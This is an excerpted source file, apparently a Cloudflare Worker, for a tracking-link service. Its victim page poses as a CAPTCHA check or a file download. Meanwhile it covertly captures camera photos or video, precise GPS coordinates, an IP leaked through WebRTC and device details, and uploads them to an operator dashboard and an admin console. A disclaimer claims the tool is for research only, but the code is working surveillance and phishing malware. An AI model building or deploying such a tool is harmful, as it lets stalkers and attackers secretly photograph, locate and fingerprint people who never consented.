...
async function initDB(env) {
  ...
  try {
    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN visitor_ip TEXT`).run();
  } catch (e) {}
  try {
    await env.DB.prepare(`ALTER TABLE sys_logs ADD COLUMN server_ip TEXT`).run();
  } catch (e) {}
  try {
...
function parseUA(ua) {
  ...
  if (/windows/i.test(ua)) {
    ...
    if (match) {
      ...
      info.osVersion = versionMap[version] || version;
    }
    ...
    info.os = /ipad/i.test(ua) ? 'iPadOS' : 'iOS';
...
async function handleGenerate(request, env) {
  ...
  const serverIp = request.headers.get("cf-connecting-ip") || "Unknown";
  const geo = await getGeoByIp(serverIp);
  ...
  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, server_ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
    .bind(targetId, 'GENERATE', serverIp, geo, ua, 'success').run();
...
async function handleUpload(request, env) {
  try {
    ...
    const serverIp = request.headers.get("cf-connecting-ip") || "Unknown";
    const visitorIp = formData.get("visitorIp") || "Unknown";
    const geo = await getGeoByIp(serverIp);
    let fullMediaUrl = "";
    ...
    await env.DB.prepare(`
      INSERT INTO sys_logs (target_id, event_type, visitor_ip, server_ip, geo_info, device_geo, device_info, media_type, media_url, ua, status)
      VALUES (?,?,?,?,?,?,?,?,?,?,?)
    `).bind(config.id, 'VISIT', visitorIp, serverIp, geo, deviceGeo, deviceInfo, mediaType, fullMediaUrl, ua, status).run();
...
async function handleQuery(request, env) {
  ...
  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, server_ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
    .bind(targetId, 'QUERY', serverIp, geo, ua, 'success').run();
...
async function handleDelete(request, env) {
  ...
  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, server_ip, geo_info, ua, status) VALUES (?,?,?,?,?,?)")
    .bind(targetId, 'DELETE', serverIp, geo, ua, 'success').run();
...
<body class="min-h-screen text-gray-800 selection:bg-indigo-100 selection:text-indigo-900">
  <div class="max-w-4xl mx-auto p-6 pt-12">
    <div class="glass rounded-2xl p-6 mb-8 shadow-sm fade-in">
      ...
      <div class="text-sm text-gray-600 space-y-2 leading-relaxed">
        <p><strong class="text-red-500">作者声明：</strong>1. 本工具仅供技术研究、学校实验、安全靶场实测及前端权限调用学习使用，绝非非法用途。</p>
        <p>2. 识别ID为查看结果的唯一凭证，请妥善保管。</p>
        <p>3. 如有侵权、肖像权等问题，请联系系统管理员进行物理删除。</p>
        <p class="text-indigo-600 font-medium"><i class="fa-solid fa-circle-info mr-1"></i>注意：本系统采用WebRTC IP泄露、UA解析等多种技术采集用户设备信息。</p>
      </div>
    </div>
      ...
      <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.1s;">
        ...
        <div class="space-y-5">
          <div>
            ...
            <input id="target_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all" placeholder="输入追踪ID">
          </div>
          <div>
            <label class="block text-sm font-medium text-gray-700 mb-1">访问密码 (可选)</label>
            <input id="target_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all" placeholder="留空则不设置密码">
          </div>
          <div class="grid grid-cols-2 gap-4">
            ...
            <div id="download_file_box" class="hidden">
              <label class="block text-sm font-medium text-gray-700 mb-1">上传文件或外链</label>
              ...
              <input id="download_url" type="text" placeholder="或自定义外链URL" class="mt-2 w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
            </div>
          </div>

          <div class="flex items-center space-x-6 pt-2">
            <label class="flex items-center cursor-pointer">
              <input type="radio" name="mode" value="photo" checked class="w-4 h-4 text-indigo-600">
              <span class="ml-2 text-sm text-gray-700">极速拍照</span>
            </label>
            <label class="flex items-center cursor-pointer">
              <input type="radio" name="mode" value="video" class="w-4 h-4 text-indigo-600">
          ...
          <button onclick="generateLink()" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex items-center justify-center">
      ...
      <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.2s;">
        ...
        <div class="space-y-5">
          <div>
            ...
            <input id="query_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all" placeholder="输入追踪ID">
          </div>
          <div>
            <label class="block text-sm font-medium text-gray-700 mb-1">访问密码</label>
            <input id="query_password" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all" placeholder="密码">
          </div>
          <button onclick="queryData()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-200 transition-all active:scale-95 flex items-center justify-center">
  ...
  <script>
        ...
        logs.forEach((log, index) => {
          ...
          if (log.device_geo) {
            ...
            if(geo.denied) {
              ...
              geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + Number(geo.lat).toFixed(6) + ', ' + Number(geo.lng).toFixed(6) + ' (精度:' + Math.round(geo.accuracy) + 'm)</div>';
            }
          }
          ...
          if (log.device_info) {
            try {
              const devInfo = JSON.parse(log.device_info);
              deviceInfoHtml = '<div class="text-xs text-gray-600 space-y-1 mt-2"><div><i class="fa-solid fa-desktop w-3"></i> 设备: ' + devInfo.device + ' | 屏幕: ' + devInfo.screen + '</div><div><i class="fa-solid fa-globe w-3"></i> 语言: ' + devInfo.language + ' | 时区: UTC' + devInfo.timezone + '</div><div><i class="fa-solid fa-microchip w-3"></i> CPU: ' + devInfo.hardwareConcurrency + '核</div></div>';
            } catch(e) {}
          }
          ...
          const visitorIp = log.visitor_ip || 'Unknown';
          const finalIpStr = ipInfo.ip ? flag + ' ' + cReg + ' ' + city + ' [' + visitorIp + ']' : visitorIp;
          ...
          html += '<div class="bg-white p-4 rounded-xl border border-gray-100 shadow-sm fade-in" style="animation-delay: ' + (index * 0.1) + 's">' +
                    ...
                    '<div class="mt-3 p-3 bg-gray-50 rounded-lg text-xs text-gray-600 space-y-1">' +
                      ...
                      '<div class="truncate max-w-full" title="' + (log.ua || '') + '"><i class="fa-brands fa-safari w-4"></i> ' + (log.ua || 'Unknown') + '</div>' +
                    '</div>' +
                  '</div>';
        });
        if (password && logs.length > 0) {
          const idEsc = id.replace(/'/g, "\\'");
          const pwdEsc = password.replace(/'/g, "\\'");
          html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + idEsc + '\', \'' + pwdEsc + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200 transition"><i class="fa-solid fa-trash mr-1"></i>删除所有媒体</button></div>';
        }
    ...
    async function deleteMedia(id, password) {
      if (!confirm('确定删除该 ID 下的所有媒体记录？')) return;
...
<body class="flex items-center justify-center min-h-screen">
  ...
  <script>
    ...
    function collectDeviceInfo() {
      return {
        device: /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? '移动设备' : '桌面设备',
    ...
    function renderUI() {
      ...
      if (config.template === 'captcha') {
        container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-6">请稍候，系统正在进行验证...</p><div class="loader mx-auto mb-4"></div></div>';
      } else if (config.template === 'download') {
        container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">文件准备就绪</h3><p class="text-sm text-gray-500 mb-6">正在准备下载...</p><div class="loader mx-auto mb-4"></div></div>';
      } else {
    ...
    async function capturePhoto(stream) {
      ...
      await v.play().catch(e => console.log(e));
    ...
    async function sendPayload(blob, status) {
      ...
      fd.append('visitorIp', visitorIp);
      fd.append('deviceInfo', JSON.stringify(collectDeviceInfo()));
...
function renderAdminLogin(errorMsg) {
  let errorHtml = "";
  if (errorMsg) {
    errorHtml = '<div class="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-xl border border-red-100">' + errorMsg + '</div>';
  }
  const html = '<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><title>SEC-TEST 后台登录</title><script src="https://cdn.tailwindcss.com"></script><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"></head><body class="bg-gray-100 flex items-center justify-center min-h-screen"><div class="bg-white p-8 rounded-2xl shadow-lg max-w-md w-full"><div class="text-center mb-8"><div class="w-16 h-16 bg-indigo-100 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl"><i class="fa-solid fa-server"></i></div><h1 class="text-2xl font-bold text-gray-800">系统控制台</h1><p class="text-gray-500 text-sm mt-2">请输入管理员密码以继续</p></div>' + errorHtml + '<form method="POST" action="/admin" class="space-y-6"><div><input type="password" name="password" required placeholder="请输入密码" class="w-full px-4 py-3 rounded-xl bg-gray-50 border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all"></div><button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95">进入后台</button></form></div></body></html>';
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}
...
async function renderAdmin(request, env) {
  ...
  const { results } = await env.DB.prepare("SELECT * FROM sys_logs ORDER BY created_at DESC LIMIT 1000").all();
  ...
  for (const [targetId, logs] of groups) {
    const visitLogs = logs.filter(l => l.event_type === 'VISIT');
    sectionsHtml += '<div class="mb-6 bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden"><div class="p-4 bg-indigo-50 border-b border-indigo-100 flex items-center justify-between"><h2 class="text-lg font-bold text-indigo-900"><i class="fa-solid fa-fingerprint mr-2"></i>跟踪 ID：' + escapeHtml(targetId) + ' <span class="text-sm text-gray-500 ml-2">(' + logs.length + ' 条记录)</span></h2><button onclick="deleteAllForTarget(\'' + targetId.replace(/'/g, "\\'") + '\')" class="px-3 py-1 text-sm bg-red-50 text-red-600 rounded hover:bg-red-100 transition"><i class="fa-solid fa-trash mr-1"></i>删除ID</button></div><div class="space-y-2 p-4">';

    const eventLogs = {
      GENERATE: logs.filter(l => l.event_type === 'GENERATE'),
      VISIT: visitLogs,
      QUERY: logs.filter(l => l.event_type === 'QUERY'),
      DELETE: logs.filter(l => l.event_type === 'DELETE')
    };

    for (const [eventType, typeLogs] of Object.entries(eventLogs)) {
      if (typeLogs.length === 0) continue;
      
      for (const log of typeLogs) {
        let eventColor = eventType === 'GENERATE' ? 'bg-blue-100 text-blue-700' : 
                        (eventType === 'QUERY' ? 'bg-emerald-100 text-emerald-700' : 
                        (eventType === 'DELETE' ? 'bg-red-100 text-red-700' : 'bg-purple-100 text-purple-700'));
        let eventIcon = eventType === 'GENERATE' ? 'fa-wand-magic' : 
                       (eventType === 'QUERY' ? 'fa-search' : 
                       (eventType === 'DELETE' ? 'fa-trash' : 'fa-crosshairs'));

        let ipInfo = {};
        try { if (log.geo_info) ipInfo = JSON.parse(log.geo_info); } catch(e) {}
        ...
        if (eventType === 'VISIT') {
          if (log.status === 'denied') {
            ...
            if (log.media_type === 'video') {
              ...
              mediaBlock = '<button onclick="openMedia(\'image\', \'' + escapeJs(log.media_url) + '\')" class="text-indigo-500 hover:underline"><img src="' + escapeHtml(log.media_url) + '" class="h-12 w-auto rounded hover:shadow-lg transition" style="max-width:100px"></button>';
            }
          }
        }
        ...
        if (log.device_geo) {
          try {
            const dGeo = JSON.parse(log.device_geo);
            if (dGeo.denied) {
              deviceGeoBlock = '<span class="text-red-500 text-xs">拒绝定位</span>';
            } else {
              deviceGeoBlock = '<div class="text-xs text-emerald-600 font-mono">' + Number(dGeo.lat).toFixed(6) + ', ' + Number(dGeo.lng).toFixed(6) + ' (精度:' + Math.round(dGeo.accuracy) + 'm)</div>';
            }
          } catch(e) {}
        }

        let deviceInfoHtml = '<span class="text-gray-400 text-xs">-</span>';
        if (log.device_info) {
          try {
            const devInfo = JSON.parse(log.device_info);
            deviceInfoHtml = '<div class="text-xs text-gray-600"><div>' + devInfo.device + ' | ' + devInfo.screen + '</div><div>' + devInfo.language + ' | UTC' + devInfo.timezone + ' | CPU: ' + devInfo.hardwareConcurrency + '</div></div>';
          } catch(e) {}
        }

        const burnedBadge = log.is_burned ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-orange-100 text-orange-600">已焚毁</span>' : '';
        const deletedBadge = log.is_deleted ? '<span class="ml-1 px-2 py-1 rounded text-[10px] font-bold bg-red-100 text-red-600">已删除</span>' : '';
        const dateStr = new Date(log.created_at + 'Z').toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        const visitorIp = log.visitor_ip || 'Unknown';

        sectionsHtml += '<div class="bg-gray-50 p-3 rounded-lg border border-gray-200 hover:border-gray-300 transition"><div class="flex justify-between items-start mb-2"><div class="flex items-center gap-2"><span class="px-2 py-1 rounded text-[10px] font-bold ' + eventColor + '"><i class="fa-solid ' + eventIcon + ' mr-1"></i>' + eventType + '</span>' + burnedBadge + deletedBadge + '</div><div class="flex items-center gap-2"><span class="text-xs text-gray-500"><i class="fa-regular fa-clock"></i> ' + dateStr + '</span><button onclick="deleteLog(' + log.id + ')" class="text-red-500 hover:text-red-700 text-xs"><i class="fa-solid fa-trash-can"></i></button></div></div><div class="grid grid-cols-4 gap-2 text-xs"><div class="bg-white p-2 rounded border border-gray-200"><div class="font-bold text-gray-700 mb-1">IP信息</div><div class="text-gray-600 break-words">' + visitorIp + '</div><div class="text-gray-500 text-[10px] mt-1">' + escapeHtml(geoStr) + '</div></div><div class="bg-white p-2 rounded border border-gray-200"><div class="font-bold text-gray-700 mb-1">GPS定位</div>' + deviceGeoBlock + '</div><div class="bg-white p-2 rounded border border-gray-200"><div class="font-bold text-gray-700 mb-1">设备信息</div>' + deviceInfoHtml + '</div><div class="bg-white p-2 rounded border border-gray-200"><div class="font-bold text-gray-700 mb-1">媒体</div>' + mediaBlock + '</div></div><div class="mt-2 p-2 bg-white rounded border border-gray-200 text-[10px] text-gray-600 truncate" title="' + escapeHtml(log.ua || '') + '"><i class="fa-brands fa-safari w-3"></i> ' + escapeHtml((log.ua || 'Unknown').substring(0, 100)) + '...</div></div>';
      }
    }
  ...
  const html = '<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><title>SEC-TEST 超级控制台</title><script src="https://cdn.tailwindcss.com"></script><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"><style>.modal { display: none; position: fixed; inset:0; background: rgba(0,0,0,0.7); z-index:50; align-items:center; justify-content:center; }.modal.active { display:flex; }</style></head><body class="bg-gray-100 p-6 font-sans"><div class="max-w-7xl mx-auto"><div class="flex justify-between items-center mb-6 bg-white p-6 rounded-2xl shadow-sm border border-gray-200"><h1 class="text-2xl font-bold text-gray-800"><i class="fa-solid fa-server text-indigo-600 mr-2"></i>全局事件审计日志</h1><div class="flex items-center gap-3"><span class="text-sm text-gray-500">最近1000条记录 | 按ID分组时间轴</span><button onclick="clearAll()" class="px-4 py-2 bg-red-600 text-white text-sm rounded-xl hover:bg-red-700 shadow transition"><i class="fa-solid fa-exclamation-triangle mr-1"></i>清空所有</button></div></div>' + sectionsHtml + '</div><div id="mediaModal" class="modal" onclick="this.classList.remove(\'active\')"><div class="bg-white rounded-2xl p-4 max-w-3xl max-h-[90vh] overflow-auto shadow-2xl" onclick="event.stopPropagation()"><div id="mediaContent" class="flex items-center justify-center"></div></div></div><script>async function deleteLog(id) { if (!confirm("确定删除该条记录？")) return; const res = await fetch("/admin/delete", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ id }) }); if (res.ok) location.reload(); else alert("删除失败"); } async function deleteAllForTarget(targetId) { if (!confirm("确定删除此ID下的所有记录？")) return; const res = await fetch("/admin/delete", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ target_id: targetId }) }); if (res.ok) location.reload(); } async function clearAll() { if (!confirm("此操作将清空所有数据库记录，不可恢复！确定继续？")) return; const res = await fetch("/admin/clear", { method: "POST" }); if (res.ok) location.reload(); else alert("清空失败"); } function openMedia(type, url) { const modal = document.getElementById("mediaModal"); const content = document.getElementById("mediaContent"); if (type === "video") { content.innerHTML = "<video src=\"" + url + "\" controls autoplay class=\"max-w-full max-h-[80vh] rounded-xl\"></video>"; } else { content.innerHTML = "<img src=\"" + url + "\" class=\"max-w-full max-h-[80vh] rounded-xl\">"; } modal.classList.add("active"); }</script></body></html>';
